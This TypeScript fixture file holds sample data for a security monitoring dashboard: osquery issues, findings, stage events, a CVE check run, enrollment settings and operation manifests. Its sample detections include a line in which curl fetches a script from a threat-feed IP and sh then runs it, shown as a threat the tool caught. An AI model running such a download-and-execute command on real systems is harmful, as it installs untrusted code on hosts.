// Sample data for the Nodes / Stage / Findings / Issues views.
//
// The views fall back to this set (with a "sample data" banner) only when the
// venapce-api call fails, so the UI stays reviewable without a backend. The
// pipeline samples form one walkable chain — stage 9002 → finding 501 → issue
// 1002 — plus rows written straight to a level, so the detail pages and the
// chain widget have every case to show.

import type {
  Finding,
  Issue,
  OsctrlEnvironment,
  StageItem,
  Activity,
  Operation,
  OperationDetail,
  OperationManifest,
} from '@/api/types'
import exampleManifest from '../../examples/operations/linux-fleet-http-audit/operation.json'

export const sampleEnvironments: OsctrlEnvironment[] = [
  { uuid: '0007038e-e791-4ae3-afd4-2e047d6639ed', name: 'saga-dev', hostname: 'localhost', type: 'osquery', icon: 'server' },
  { uuid: 'a19c2f40-1b2c-4c8e-9f2a-77c1d0f4b210', name: 'prod-edge', hostname: 'osctrl.venapce.io', type: 'osquery', icon: 'cloud' },
]

export const sampleIssues: Issue[] = [
  {
    id: 1001, title: 'Unexpected outbound connection to known-bad host', status: 'open', severity: 'critical',
    tags: ['untrusted', 'network', 'prod-edge'], source: 'osctrl:web-01.prod', origin: 'flomorphic:flow/threat-feed',
    summary: 'osquery detected a process contacting an IP on the threat feed.',
    createdAt: new Date(Date.now() - 30 * 60_000).toISOString(),
    data: {
      process: { pid: 4121, name: 'curl', cmdline: 'curl -s http://185.220.101.4/x.sh', user: 'www-data' },
      connection: { remote: '185.220.101.4', port: 80, proto: 'tcp', bytes_out: 1834 },
      feed: { name: 'abuse.ch', match: 'ip', confidence: 0.92, first_seen: '2026-09-11T08:02:00Z' },
    },
    meta: { enrichment: { asn: 'AS205100', country: 'NL', tor_exit: true }, correlated_events: 3 },
    ref: { flow: 'threat-feed', run: 'run_8f2c1', rule: 'ip-on-feed', query: 'process_open_sockets' },
  },
  {
    id: 1002, title: 'New kernel module loaded outside baseline', status: 'proceed', severity: 'high',
    tags: ['untrusted', 'integrity'], source: 'osctrl:db-01.prod', origin: 'finding:promote', findingId: 501, stageId: 9002,
    summary: 'A kernel module not present in the golden image was loaded.',
    createdAt: new Date(Date.now() - 5 * 3600_000).toISOString(),
    data: { module: { name: 'nf_tables_compat', size: 40960, used_by: [] }, baseline: 'golden-2026.08', diff: ['nf_tables_compat'] },
    meta: { reviewed_by: '', ticket: '' },
    ref: { promotedFrom: { kind: 'finding', id: 501, origin: 'flomorphic:flow/baseline-drift', ref: { promotedFrom: { kind: 'stage', id: 9002 } } } },
  },
  {
    id: 1003, title: 'Scheduled task created by admin', status: 'resolved', severity: 'low',
    tags: ['trusted', 'change'], source: 'osctrl:ANALYST-WIN', origin: 'flomorphic:flow/change-review',
    summary: 'Change reviewed and matched an approved maintenance window.',
    createdAt: new Date(Date.now() - 26 * 3600_000).toISOString(),
    data: { task: { name: '\\Microsoft\\Windows\\Backup\\Nightly', action: 'C:\\ops\\backup.ps1', author: 'CORP\\admin' }, window: 'MW-2026-37' },
  },
  {
    id: 1004, title: 'Login from new geography', status: 'open', severity: 'medium',
    tags: ['untrusted', 'identity'], source: 'siem:auth', origin: 'flomorphic:flow/identity',
    summary: 'First successful login from a country not seen for this identity.',
    createdAt: new Date(Date.now() - 2 * 3600_000).toISOString(),
    data: { identity: 'j.doe', ip: '102.89.33.10', geo: { country: 'NG', city: 'Lagos' }, previous_countries: ['DE', 'NL'] },
  },
  {
    id: 1005, title: 'Package manager invoked package install', status: 'proceed', severity: 'info',
    tags: ['trusted', 'change', 'prod-edge'], source: 'osctrl:web-02.prod', origin: 'flomorphic:flow/change-review',
    summary: 'apt install traced to the deployment pipeline.',
    createdAt: new Date(Date.now() - 9 * 3600_000).toISOString(),
    data: { packages: ['nginx=1.26.2-1', 'libssl3'], invoked_by: 'deploy-bot', pipeline_run: 'gha-55821' },
  },
]

export const sampleFindings: Finding[] = [
  {
    id: 501, title: 'Kernel module drift against golden image', status: 'promoted', severity: 'high', confidence: 'high',
    category: 'integrity', tags: ['integrity'], source: 'osctrl:db-01.prod', origin: 'flomorphic:flow/baseline-drift',
    target: 'db-01.prod', fingerprint: 'baseline-drift:db-01.prod:kernel_modules', stageId: 9002, issueId: 1002,
    summary: 'kernel_modules differs from golden-2026.08 by one entry.',
    createdAt: new Date(Date.now() - 5 * 3600_000).toISOString(),
    data: { table: 'kernel_modules', added: [{ name: 'nf_tables_compat', size: 40960 }], removed: [] },
    meta: { baseline: { name: 'golden-2026.08', hash: 'sha256:9f1c…' }, host_role: 'database' },
    ref: { promotedFrom: { kind: 'stage', id: 9002, origin: 'osctrl:file_events' }, rule: 'baseline-drift', run: 'run_2a77e' },
  },
  {
    id: 502, title: 'SSH exposed to the internet', status: 'new', severity: 'medium', confidence: 'medium',
    category: 'exposure', tags: ['network', 'prod-edge'], source: 'osctrl:web-02.prod', origin: 'flomorphic:flow/exposure-scan',
    target: 'web-02.prod', fingerprint: 'exposure:web-02.prod:22',
    summary: 'sshd listening on 0.0.0.0:22 with password auth enabled.',
    createdAt: new Date(Date.now() - 70 * 60_000).toISOString(),
    data: { listening: { port: 22, address: '0.0.0.0', process: 'sshd' }, sshd_config: { PasswordAuthentication: 'yes', PermitRootLogin: 'no' } },
    ref: { flow: 'exposure-scan', queries: ['listening_ports', 'file'], run: 'run_c31d0' },
  },
  {
    id: 503, title: 'Outdated OpenSSL on analyst workstation', status: 'triaged', severity: 'low', confidence: 'high',
    category: 'vulnerability', tags: ['patch'], source: 'osctrl:macbook-sec', origin: 'flomorphic:flow/vuln-match',
    target: 'macbook-sec', fingerprint: 'vuln:macbook-sec:CVE-2026-1153',
    summary: 'Installed 3.2.1 < fixed 3.2.4 (CVE-2026-1153).',
    createdAt: new Date(Date.now() - 20 * 3600_000).toISOString(),
    data: { package: { name: 'openssl', version: '3.2.1' }, cve: { id: 'CVE-2026-1153', cvss: 5.3, fixed_in: '3.2.4' } },
    meta: { exploit_available: false, kev: false },
  },
  {
    id: 504, title: 'Impossible-travel pattern for j.doe', status: 'false_positive', severity: 'medium', confidence: 'low',
    category: 'identity', tags: ['identity'], source: 'siem:auth', origin: 'flomorphic:flow/identity',
    target: 'j.doe', fingerprint: 'identity:j.doe:impossible-travel',
    summary: 'Two logins 400km apart within 15 min — VPN egress, dismissed.',
    createdAt: new Date(Date.now() - 2 * 24 * 3600_000).toISOString(),
    data: { logins: [{ ip: '81.2.69.142', geo: 'London', at: '2026-09-16T09:01:00Z' }, { ip: '185.60.216.35', geo: 'Dublin', at: '2026-09-16T09:14:00Z' }] },
    meta: { dismissed_reason: 'corporate VPN egress', dismissed_by: 'analyst' },
  },
]

export const sampleStage: StageItem[] = [
  {
    id: 9001, title: 'process_events burst on web-01', source: 'osctrl:web-01.prod', origin: 'osctrl:process_events', disposition: 'pending',
    tags: ['network'], summary: '312 process_events in 10s — awaiting flow evaluation.',
    receivedAt: new Date(Date.now() - 90_000).toISOString(),
    data: {
      window: { from: '2026-09-19T01:00:00Z', to: '2026-09-19T01:00:10Z', count: 312 },
      sample: [
        { pid: 4121, path: '/usr/bin/curl', cmdline: 'curl -s http://185.220.101.4/x.sh', uid: 33 },
        { pid: 4122, path: '/bin/sh', cmdline: 'sh -c x.sh', uid: 33 },
      ],
      top_paths: { '/usr/bin/curl': 140, '/bin/sh': 120, '/usr/bin/python3': 52 },
    },
    meta: { node: { uuid: '7d3b…', platform: 'ubuntu', env: 'prod-edge' } },
    ref: { query: 'process_events', schedule: 'every 10s', batch: 'b_1a9' },
  },
  {
    id: 9002, title: 'file_events under /etc on db-01', source: 'osctrl:db-01.prod', origin: 'osctrl:file_events', disposition: 'promoted',
    findingId: 501, issueId: 1002, tags: ['integrity'], summary: 'Met the "baseline drift" criteria → finding #501 → issue #1002.',
    receivedAt: new Date(Date.now() - 5 * 3600_000).toISOString(),
    data: { events: [{ target_path: '/etc/modules-load.d/nf.conf', action: 'CREATED', size: 18 }], count: 1 },
    ref: { query: 'file_events', batch: 'b_0f2' },
  },
  {
    id: 9003, title: 'Heartbeat gap', source: 'osctrl:web-02.prod', origin: 'osctrl:heartbeat', disposition: 'dropped',
    tags: [], summary: 'Transient; recovered within threshold — dropped by flow.',
    receivedAt: new Date(Date.now() - 40 * 60_000).toISOString(),
    data: { last_seen: '2026-09-19T00:14:00Z', gap_seconds: 94, threshold_seconds: 120 },
  },
  {
    id: 9004, title: 'Auth log spike', source: 'siem:auth', origin: 'siem:webhook', disposition: 'held',
    tags: ['identity'], summary: 'Held for correlation window before routing.',
    receivedAt: new Date(Date.now() - 12 * 60_000).toISOString(),
    data: { failed_logins: 57, users: ['j.doe', 'svc-backup'], sources: ['102.89.33.10'] },
    meta: { hold_until: new Date(Date.now() + 18 * 60_000).toISOString() },
  },
]

// A row's history: a flow run with its lifted outcome (typed facts, remediation,
// proof), plus the manual edit and the promotion that came before it.
export const sampleActivities: Activity[] = [
  {
    id: 7003, subjectKind: 'stage', subjectId: 9001, kind: 'run', status: 'finished',
    title: 'CVE check: 3 packages with known vulnerabilities', flowId: 'flow_sample_cve', flowTitle: 'Installed packages — CVE check (LLM)',
    origin: 'flow:flow_sample_cve', processId: 48, pid: '98627c5d-867f-48fd-9d0c-b61e0470bf79', contextId: 'ctx_sample',
    description: 'Of 212 apt packages, 3 have a published CVE affecting the installed version: openssl 3.0.2 (CVE-2024-5535, CVE-2024-4741), nginx 1.24.0 (CVE-2024-7347), curl 7.81.0 (CVE-2024-2398). No exploitation evidence on the node.',
    remediation: 'apt-get install --only-upgrade openssl nginx curl; reload nginx. openssl fix is in 3.0.13-0ubuntu3.2.',
    proof: 'openssl 3.0.2 < 3.0.14 (CVE-2024-5535, NVD 2024-06-27); nginx 1.24.0 ≤ 1.27.0 (CVE-2024-7347); curl 7.81.0 (CVE-2024-2398, fixed 8.7.0).',
    facts: [
      { k: 'severity', v: 'high' }, { k: 'packages', v: 212 }, { k: 'vulnerable', v: 3 },
      { k: 'cve', v: ['CVE-2024-5535', 'CVE-2024-4741', 'CVE-2024-7347', 'CVE-2024-2398'] }, { k: 'exploited', v: false },
    ],
    tags: ['cve', 'apt', 'llm'],
    ref: { process: { indexId: 48, pid: '98627c5d-867f-48fd-9d0c-b61e0470bf79', status: 'finished', durationMs: 48210 } },
    data: {
      outcome: { title: 'CVE check: 3 packages with known vulnerabilities', facts: { severity: 'high', packages: 212, vulnerable: 3 } },
      checks: [
        { package: 'openssl', version: '3.0.2', cves: ['CVE-2024-5535', 'CVE-2024-4741'], fixed_in: '3.0.14' },
        { package: 'nginx', version: '1.24.0', cves: ['CVE-2024-7347'], fixed_in: '1.27.1' },
        { package: 'curl', version: '7.81.0', cves: ['CVE-2024-2398'], fixed_in: '8.7.0' },
      ],
    },
    startedAt: new Date(Date.now() - 6 * 60_000).toISOString(),
    finishedAt: new Date(Date.now() - 5 * 60_000).toISOString(),
    createdAt: new Date(Date.now() - 6 * 60_000).toISOString(),
  },
  {
    id: 7002, subjectKind: 'stage', subjectId: 9001, kind: 'edit', status: 'finished', title: 'Edited disposition, tags', origin: 'manual',
    ref: { changed: { disposition: { from: 'pending', to: 'held' }, tags: { from: [], to: ['network'] } } },
    finishedAt: new Date(Date.now() - 40 * 60_000).toISOString(),
    createdAt: new Date(Date.now() - 40 * 60_000).toISOString(),
  },
  {
    id: 7001, subjectKind: 'stage', subjectId: 9002, kind: 'promote', status: 'finished', title: 'Promoted to finding #501', origin: 'flow:flow_sample_drift',
    ref: { to: { kind: 'finding', id: 501 } },
    finishedAt: new Date(Date.now() - 5 * 3600_000).toISOString(),
    createdAt: new Date(Date.now() - 5 * 3600_000).toISOString(),
  },
]

// osctrl builds each script URL as https://{host}/{envUUID}/{linkPath}/{script},
// where the enroll and remove links carry their own independent path secret.
// (Placeholder tokens — never commit a real deployment's link secrets.)
const SAMPLE_HOST = 'osctrl.venapce.io'
const SAMPLE_ENV_UUID = '118d50c6-434e-4126-b010-a6627d15641e'
const SAMPLE_ENROLL_PATH = '2KqRb7mXsVc4Np8Wd3Yf6Hj9Lt'
const SAMPLE_REMOVE_PATH = '5ZgN4vBc8Km2Qw7Rt1Yx3Ps6Hd'

const scriptUrl = (path: string, script: string) =>
  `https://${SAMPLE_HOST}/${SAMPLE_ENV_UUID}/${path}/${script}`

export const sampleEnroll = {
  secret: 'S3cr3t-ENROLL-key-do-not-share',
  hostname: SAMPLE_HOST,
  envUUID: SAMPLE_ENV_UUID,
  enroll: {
    enabled: true,
    expires: new Date(Date.now() + 21 * 24 * 3600_000).toISOString(),
    path: SAMPLE_ENROLL_PATH,
  },
  remove: {
    enabled: true,
    expires: new Date(Date.now() + 7 * 24 * 3600_000).toISOString(),
    path: SAMPLE_REMOVE_PATH,
  },
  flags: [
    '--enroll_secret_path=/etc/osquery/osquery.secret',
    `--tls_hostname=${SAMPLE_HOST}`,
    '--host_identifier=uuid',
    '--enroll_tls_endpoint=/prod-edge/enroll',
    '--config_tls_endpoint=/prod-edge/config',
    '--logger_tls_endpoint=/prod-edge/log',
  ].join('\n'),
  oneLiner: {
    linux: `curl -s ${scriptUrl(SAMPLE_ENROLL_PATH, 'enroll.sh')} | sh`,
    darwin: `curl -s ${scriptUrl(SAMPLE_ENROLL_PATH, 'enroll.sh')} | sh`,
    windows: `iwr -useb ${scriptUrl(SAMPLE_ENROLL_PATH, 'enroll.ps1')} | iex`,
  },
  removeOneLiner: {
    linux: `curl -s ${scriptUrl(SAMPLE_REMOVE_PATH, 'remove.sh')} | sh`,
    darwin: `curl -s ${scriptUrl(SAMPLE_REMOVE_PATH, 'remove.sh')} | sh`,
    windows: `iwr -useb ${scriptUrl(SAMPLE_REMOVE_PATH, 'remove.ps1')} | iex`,
  },
  packages: [
    { format: 'deb', arch: 'amd64', url: `https://${SAMPLE_HOST}/pkg/osquery_5.12.1_amd64.deb` },
    { format: 'deb', arch: 'arm64', url: `https://${SAMPLE_HOST}/pkg/osquery_5.12.1_arm64.deb` },
    { format: 'rpm', arch: 'x86_64', url: `https://${SAMPLE_HOST}/pkg/osquery-5.12.1.x86_64.rpm` },
    { format: 'pkg', arch: 'universal', url: `https://${SAMPLE_HOST}/pkg/osquery-5.12.1.pkg` },
    { format: 'msi', arch: 'x64', url: `https://${SAMPLE_HOST}/pkg/osquery-5.12.1.msi` },
  ],
}


// ---- Operations ----
// The shipped example package (examples/operations/linux-fleet-http-audit) as
// an installed operation, plus two catalog-style entries in other states, so
// the list shows a ready, a half-bound and a blocked card.

const httpAuditManifest = exampleManifest as unknown as OperationManifest

const githubIssuesManifest: OperationManifest = {
  schema: 1,
  id: 'issues-to-github',
  name: 'Issues → GitHub',
  version: '0.3.1',
  description: 'Open a GitHub issue for every Venapce issue that reaches "proceed", keep the two in sync, and close the GitHub side when the Venapce issue is resolved.',
  tags: ['tracking', 'github', 'workflow'],
  scale: ['smb', 'vps', 'fleet', 'enterprise'],
  params: {
    repo: { type: 'string', label: 'Repository', description: 'owner/name of the tracker repository', required: true },
    labels: { type: 'string[]', label: 'Labels', default: ['venapce'] },
  },
  flows: [
    { key: 'open', file: 'flows/open-issue.flow.json', title: 'Open GitHub issue for a Venapce issue', role: 'on-row', step: 1, subject: ['issue'], writes: ['activities'], description: 'Run on an issue that reached "proceed": creates the GitHub issue and records its number on the row.' },
    { key: 'sync', file: 'flows/sync.flow.json', title: 'Sync open issues', role: 'entry', step: 2, schedule: '*/30 * * * *', writes: ['issues', 'activities'], description: 'Every half hour: mirrors GitHub state back (closed there → resolved here).' },
  ],
  requires: {
    osctrl: { required: false },
    plugins: [
      { name: 'github', actions: ['github.issues.create', 'github.issues.update', 'github.issues.get'], repo: 'https://github.com/FloMorphic/builtin-plugins', subdir: 'github' },
      { name: 'venapce', actions: ['db.issues.update', 'db.activities.update'] },
    ],
  },
}

const sshExposureManifest: OperationManifest = {
  schema: 1,
  id: 'ssh-exposure',
  name: 'SSH exposure & weak auth',
  version: '1.2.0',
  description: 'Sweep every enrolled Linux node for sshd listening on public interfaces, password authentication left on, root login allowed and stale authorized_keys; raise a Finding per host with the offending directives as facts.',
  tags: ['linux', 'ssh', 'exposure', 'hardening'],
  scale: ['vps', 'fleet', 'enterprise'],
  params: {
    env: { type: 'string', label: 'osctrl environment', default: 'default', required: true },
    fleetTags: { type: 'string[]', label: 'Fleet tags', default: ['default'], required: true },
    maxKeyAge: { type: 'number', label: 'Max authorized_keys age (days)', default: 365 },
  },
  flows: [
    { key: 'sweep', file: 'flows/sweep.flow.json', title: 'SSH exposure sweep', role: 'entry', step: 1, doc: 'docs/sweep.md', schedule: '0 3 * * *', writes: ['findings'], description: 'Nightly: queries sshd_config and authorized_keys on every tagged node; one Finding per host with the offending directives as facts.' },
    { key: 'summarise', file: 'flows/summarise.flow.json', title: 'Summarise a finding with an LLM', role: 'on-row', step: 2, doc: 'docs/summarise.md', subject: ['finding'], writes: ['activities'], description: 'On a finding: turns the facts into a one-paragraph remediation note (needs an LLM settings profile).' },
  ],
  requires: {
    osctrl: { required: true, targets: ['linux'], minNodes: 1 },
    plugins: [{ name: 'venapce', actions: ['osquery.queryByTags', 'db.findings.upsert'] }],
    settings: [{ kind: 'llm', for: 'Summarise a finding', note: 'Any chat model profile; the summary is one paragraph.' }],
  },
  provides: { tags: ['ssh', 'exposure'] },
}

const ago = (h: number) => new Date(Date.now() - h * 3600_000).toISOString()

export const sampleOperations: Operation[] = [
  {
    id: 1, key: httpAuditManifest.id, name: httpAuditManifest.name, version: httpAuditManifest.version,
    description: httpAuditManifest.description, tags: httpAuditManifest.tags, scale: httpAuditManifest.scale,
    source: { kind: 'url', url: 'https://github.com/FloMorphic/flow-cookbook', ref: 'main', path: 'linux-fleet-http-audit' },
    params: { env: 'default', fleetTags: ['default', 'linuxmint'] },
    ready: true, flowsBound: 1, flowsTotal: 1, lastRunAt: ago(5), lastRunStatus: 'finished', installedAt: ago(72), updatedAt: ago(72),
  },
  {
    id: 2, key: sshExposureManifest.id, name: sshExposureManifest.name, version: sshExposureManifest.version,
    description: sshExposureManifest.description, tags: sshExposureManifest.tags, scale: sshExposureManifest.scale,
    source: { kind: 'folder', folder: 'ssh-exposure' },
    params: { env: 'default', fleetTags: ['default'] },
    ready: false, flowsBound: 1, flowsTotal: 2, installedAt: ago(30), updatedAt: ago(30),
  },
  {
    id: 3, key: githubIssuesManifest.id, name: githubIssuesManifest.name, version: githubIssuesManifest.version,
    description: githubIssuesManifest.description, tags: githubIssuesManifest.tags, scale: githubIssuesManifest.scale,
    source: { kind: 'url', url: 'https://github.com/venapce/operations', ref: 'main', path: 'issues-to-github' },
    params: { labels: ['venapce'] },
    ready: false, flowsBound: 0, flowsTotal: 2, installedAt: ago(2), updatedAt: ago(2),
  },
]

export const sampleOperationDetails: Record<string, OperationDetail> = {
  1: {
    ...sampleOperations[0]!,
    manifest: httpAuditManifest,
    flows: [
      { ...httpAuditManifest.flows[0]!, flowId: 'flow_http_audit_demo', flowTitle: httpAuditManifest.flows[0]!.title, installedAt: ago(72),
        lastRun: { id: 9101, status: 'finished', title: 'Linux fleet — HTTP / nginx + served hostnames audit', startedAt: ago(5), finishedAt: ago(4.9) } },
    ],
    readiness: {
      ready: true,
      checks: [
        { kind: 'osctrl', label: 'osctrl fleet manager', status: 'ok', detail: 'Connected · 12 Linux nodes carry the fleet tags', fix: 'settings' },
        { kind: 'plugin', label: 'venapce plugin in FloMorphic', status: 'ok', detail: 'Provides db.stages.upsert, osquery.query, osquery.queryByTags', fix: 'settings' },
        { kind: 'flow', label: 'Flow "http-audit" bound', status: 'ok', detail: 'flow_http_audit_demo' },
      ],
    },
    readme: '# Linux fleet HTTP audit\n\nAsk a whole Linux fleet **"who is serving HTTP, where, and under which names?"** and get one evidence row per node in Stage.\n\n## After install\n\nSet `env` and `fleetTags` to the environment and tags that select *your* Linux nodes, then press **Run**.',
  },
  2: {
    ...sampleOperations[1]!,
    manifest: sshExposureManifest,
    flows: [
      { ...sshExposureManifest.flows[0]!, flowId: 'flow_ssh_sweep_demo', flowTitle: 'SSH exposure sweep', installedAt: ago(30) },
      { ...sshExposureManifest.flows[1]! },
    ],
    readiness: {
      ready: false,
      checks: [
        { kind: 'osctrl', label: 'osctrl fleet manager', status: 'ok', detail: 'Connected', fix: 'settings' },
        { kind: 'plugin', label: 'venapce plugin in FloMorphic', status: 'ok', detail: 'Provides osquery.queryByTags, db.findings.upsert', fix: 'settings' },
        { kind: 'settings', label: 'llm settings profile for Summarise a finding', status: 'unknown', detail: 'Any chat model profile; the summary is one paragraph.' },
        { kind: 'flow', label: 'Flow "summarise" not installed', status: 'missing', detail: 'Install it into FloMorphic or link an existing flow' },
      ],
    },
    readme: '# SSH exposure & weak auth\n\n## Mission\n\nFind every sshd on the fleet that is reachable on a public interface with password authentication, root login or stale keys, and hand the operator a per-host finding with a remediation note.\n\n## Flows\n\n### Step 1 — SSH exposure sweep (`sweep`, entry)\n\nNightly sweep over the tagged Linux nodes; one Finding per host with the offending directives as facts.\n\n### Step 2 — Summarise a finding with an LLM (`summarise`, on a finding)\n\nRun on a finding from step 1: writes a remediation paragraph onto its timeline.',
    flowDocs: {
      sweep: '# Flow: SSH exposure sweep\n\n**Role:** entry (step 1).\n\n## Topology\n\n```\nStart → osquery.queryByTags (sshd_config directives) → js: classify per host → db.findings.upsert (scope $.hosts[*])\n```\n\n## Reads\n\n- `${param.env}`, `${param.fleetTags}` — where to look.\n- `${param.maxKeyAge}` — an authorized_keys entry older than this is reported as stale.\n\n## Writes\n\nOne Finding per host: severity from the worst directive, facts `PasswordAuthentication`, `PermitRootLogin`, `ListenAddress`, `stale_keys`.',
      summarise: '# Flow: Summarise a finding with an LLM\n\n**Role:** on a finding (step 2).\n\nReads `$.row.facts` and `$.row.data`, asks the model for a one-paragraph remediation, writes it to `$.outcome.remediation`.\n\n## After import\n\nPick an LLM settings profile on the model node — the export carries none.',
    },
  },
  3: {
    ...sampleOperations[2]!,
    manifest: githubIssuesManifest,
    flows: githubIssuesManifest.flows.map((f) => ({ ...f })),
    readiness: {
      ready: false,
      checks: [
        { kind: 'plugin', label: 'github plugin', status: 'missing', detail: 'Needs github.issues.create, github.issues.update, github.issues.get — install from https://github.com/FloMorphic/builtin-plugins (github/)', href: 'https://github.com/FloMorphic/builtin-plugins' },
        { kind: 'plugin', label: 'venapce plugin in FloMorphic', status: 'ok', detail: 'Provides db.issues.update, db.activities.update', fix: 'settings' },
        { kind: 'param', label: 'Parameter "Repository"', status: 'missing', detail: 'Required, and it has no default — set it before installing' },
        { kind: 'flow', label: 'Flow "open" not installed', status: 'missing' },
        { kind: 'flow', label: 'Flow "sync" not installed', status: 'missing' },
      ],
    },
  },
}
